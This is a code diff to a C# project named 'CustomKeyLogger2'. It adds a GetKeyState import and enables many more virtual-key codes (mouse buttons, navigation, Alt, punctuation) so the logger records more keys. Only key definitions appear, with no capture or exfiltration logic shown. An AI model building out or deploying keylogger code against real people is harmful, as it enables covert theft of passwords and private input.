@@ -42,6 +42,9 @@ namespace CustomKeyLogger2
             public static extern IntPtr GetModuleHandle(
                 string lpModuleName);
 
+            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            public static extern IntPtr GetKeyState(
+                IntPtr virtualKeyCode);
         }
 
         public enum VK
@@ -49,36 +52,36 @@ namespace CustomKeyLogger2
             //Keycodes may be found on many internet sites.
             //Some keys are commented feel free to uncomment them, explanations are provided for uncommon ones ;)
 
-            //VK_LBUTTON = 0X01, //Left mouse
-            //VK_RBUTTON = 0X02, //Right mouse
-            //VK_CANCEL       = 0X03,
-            //VK_MBUTTON = 0X04,
+            VK_LBUTTON = 0X01, //Left mouse
+            VK_RBUTTON = 0X02, //Right mouse
+            VK_CANCEL = 0X03,
+            VK_MBUTTON = 0X04,
             VK_BACK = 0X08, //Backspace
             VK_TAB = 0X09,
-            //VK_CLEAR        = 0X0C,
+            VK_CLEAR = 0X0C,
             VK_RETURN = 0X0D, //Enter
             VK_SHIFT = 0X10,
             VK_CONTROL = 0X11, //CTRL
-            //VK_MENU         = 0X12,
-           // VK_PAUSE = 0X13,
+            VK_MENU = 0X12,
+            VK_PAUSE = 0X13,
             VK_CAPITAL = 0X14, //Caps-Lock
-            //VK_ESCAPE = 0X1B,
+            VK_ESCAPE = 0X1B,
             VK_SPACE = 0X20,
-            //VK_PRIOR = 0X21, //Page-Up
-            //VK_NEXT = 0X22, //Page-Down
-            //VK_END = 0X23,
-            //VK_HOME = 0X24,
+            VK_PRIOR = 0X21, //Page-Up
+            VK_NEXT = 0X22, //Page-Down
+            VK_END = 0X23,
+            VK_HOME = 0X24,
             VK_LEFT = 0X25,
             VK_UP = 0X26,
             VK_RIGHT = 0X27,
             VK_DOWN = 0X28,
-            //VK_SELECT       = 0X29,
-            //VK_PRINT        = 0X2A,
-            //VK_EXECUTE      = 0X2B,
-            //VK_SNAPSHOT = 0X2C, //Print Screen
+            VK_SELECT = 0X29,
+            VK_PRINT = 0X2A,
+            VK_EXECUTE = 0X2B,
+            VK_SNAPSHOT = 0X2C, //Print Screen
             VK_INSERT = 0X2D,
             VK_DELETE = 0X2E,
-            //VK_HELP         = 0X2F,
+            VK_HELP = 0X2F,
 
             VK_0 = 0X30,
             VK_1 = 0X31,
@@ -129,10 +132,12 @@ namespace CustomKeyLogger2
             VK_NUMPAD8 = 0X68,
             VK_NUMPAD9 = 0X69,
 
-            VK_SEPERATOR = 0X6C, // | (shift + backslash)
-            VK_SUBTRACT = 0X6D, // -
-            VK_DECIMAL = 0X6E, // .
-            VK_DIVIDE = 0X6F, // /
+            VK_MULTIPLY = 0x6A,     // *
+            VK_ADD = 0x6B,          // +
+            VK_SEPERATOR = 0X6C,    // | (shift + backslash)
+            VK_SUBTRACT = 0X6D,     // -
+            VK_DECIMAL = 0X6E,      // .
+            VK_DIVIDE = 0X6F,       // /
 
             VK_F1 = 0X70,
             VK_F2 = 0X71,
@@ -149,15 +154,24 @@ namespace CustomKeyLogger2
             //and for the 8 people in the world who do, I think they can live without using them
 
             VK_NUMLOCK = 0X90,
-            //VK_SCROLL = 0X91, //Scroll-Lock
+            VK_SCROLL = 0X91, //Scroll-Lock
             VK_LSHIFT = 0XA0,
             VK_RSHIFT = 0XA1,
             VK_LCONTROL = 0XA2,
             VK_RCONTROL = 0XA3,
-            //VK_LMENU        = 0XA4,
-            //VK_RMENU        = 0XA5,
-            //VK_PLAY         = 0XFA,
-            //VK_ZOOM         = 0XFB
+            VK_LMENU = 0XA4,
+            VK_RMENU = 0XA5,
+
+            VK_OEM_1 = 0xBA,        // ';' / ':'
+            VK_OEM_PLUS = 0xBB,     // '=' / '+'
+            VK_OEM_COMMA = 0xBC,    // ',' / '<'
+            VK_OEM_MINUS = 0xBD,    // '-' / '_'
+            VK_OEM_PERIOD = 0xBE,   // '.' / '>'
+            VK_OEM_2 = 0xBF,        // '/' / '?'
+            VK_OEM_3 = 0xC0,        // '`' / '~'
+
+            VK_PLAY = 0XFA,
+            VK_ZOOM = 0XFB
         } //keycodes
 
         //There are detailed explanations for these functions on MSDNAA and implementations.
